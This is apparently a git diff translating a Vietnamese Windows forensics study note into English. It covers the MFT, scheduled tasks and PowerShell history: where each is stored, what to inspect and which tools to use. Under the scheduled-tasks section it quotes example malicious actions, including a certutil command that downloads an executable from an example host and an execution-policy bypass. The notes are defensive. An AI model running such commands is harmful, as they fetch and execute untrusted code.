-vị trí: Nằm ẩn tại thư mục gốc của bất kỳ phân vùng nào được định dạng NTFS (Ví dụ đường dẫn logic: C:\$MFT). Tệp tin này bị khóa ở cấp độ nhân (Kernel) của hệ điều hành, không thể nhìn thấy hay truy cập qua File Explorer thông thường, mà phải trích xuất thông qua các công cụ đọc đĩa vật lý
+location: Hidden at the root of any NTFS formatted partition (Example logical path: C:\$MFT). This file is locked at the kernel level of the operating system, cannot be seen or accessed through regular File Explorer, but must be extracted through physical disk reading tools.
 
 
 <img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/85b9da67-065a-4abc-b1ca-c2e1eb3c9e95" />
 
 
-soi gì:
+what to look for:
 - filename
-- full path nếu reconstruct được
+- full path if reconstructable
 - file size
 - allocated/deleted status
 - MFT entry number
@@ -816,12 +816,12 @@ soi gì:
 - ADS information
 - timestamps
 
-timestamp quan trọng:
+important timestamp:
 
 $STANDARD_INFORMATION
 $FILE_NAME
 
-mỗi nhóm thường có:
+Each group usually has:
 
 Created
 Modified
@@ -837,21 +837,21 @@ tool:
 - KAPE
 - Timeline Explorer
 
-MFT để dựng timeline file system. nó có thể cho thấy file đã từng tồn tại dù hiện bị xóa. khi nghi timestomping, nên so timestamp giữa $STANDARD_INFORMATION và $FILE_NAME.
+MFT to build a timeline file system. it can show that the file once existed even though it is now deleted. When suspecting timestomping, you should compare the timestamp between $STANDARD_INFORMATION and $FILE_NAME.
 
 
 10. scheduled tasks
 
-công dụng:
-scheduled tasks dùng để tự động chạy chương trình theo lịch hoặc trigger. trong for, artifact này rất quan trọng vì malware hay dùng nó để persistence.
+Uses:
+Scheduled tasks are used to automatically run programs according to a schedule or trigger. In for, this artifact is very important because malware often uses it for persistence.
 
-vị trí task XML:
+task XML location:
 
 C:\Windows\System32\Tasks\
 
 <img width="954" height="1048" alt="image" src="https://github.com/user-attachments/assets/880187f2-f498-4ba4-9b66-40946da5c98b" />
 
-vị trí registry:
+registry location:
 
 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
 
@@ -867,7 +867,7 @@ event log:
 
 C:\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx
 
-soi gì:
+what to look for:
 - task name
 - author
 - user id
@@ -882,7 +882,7 @@ soi gì:
 - last run time
 - next run time
 
-action đáng ngờ:
+suspicious action:
 
 powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\a.ps1
 cmd.exe /c certutil -urlcache -f http://example.com/a.exe a.exe
@@ -896,16 +896,16 @@ tool:
 - EvtxECmd
 - KAPE
 
-ghi chú:
-khi thấy malware chạy lại sau reboot, nên soi scheduled tasks cùng Run/RunOnce/Services. task có thể bị xóa, nên cần soi thêm event log TaskScheduler.
+note:
+When you see malware running again after reboot, you should look for scheduled tasks with Run/RunOnce/Services. Tasks can be deleted, so you need to look at the TaskScheduler event log.
 
 
 11. powershell history
 
-công dụng:
-powershell history lưu lại lệnh user nhập trong PowerShell interactive session. artifact này giúp biết attacker/user đã gõ lệnh gì.
+Uses:
+powershell history saves user commands entered during a PowerShell interactive session. This artifact helps know what commands the attacker/user has typed.
 
-vị trí:
+location:
 
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
@@ -913,18 +913,18 @@ C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH
 <img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/b9f6b8ea-7f0a-4ab1-bfe4-6a6364480b21" />
 
 
-soi gì:
-- lệnh tải file
-- lệnh chạy script
+what to look for:
+- file download command
+- command to run script
 - encoded command
 - bypass execution policy
 - disable defender
-- tạo scheduled task
-- tạo registry persistence
-- tạo user
-- gọi web request
+- create scheduled tasks
+- create registry persistence
+- create user
+- call web request
 
-lệnh đáng chú ý:
+Notable commands:
 
 Invoke-WebRequest
 
@@ -960,7 +960,7 @@ New-ScheduledTask
 
 schtasks
 
-artifact liên quan:
+Related artifacts:
 
 C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
 
@@ -981,8 +981,8 @@ tool:
 - Hayabusa
 - CyberChef
 
-ghi chú:
-powershell history có thể bị xóa rất dễ, nên không nên phụ thuộc một mình nó. phải đối chiếu thêm event logs 4103/4104, prefetch, scheduled tasks và MFT.
+note:
+Powershell history can be deleted very easily, so don't rely on it alone. Must also compare event logs 4103/4104, prefetch, scheduled tasks and MFT.
 
 lab Windowns Fudamentals 1
 ```
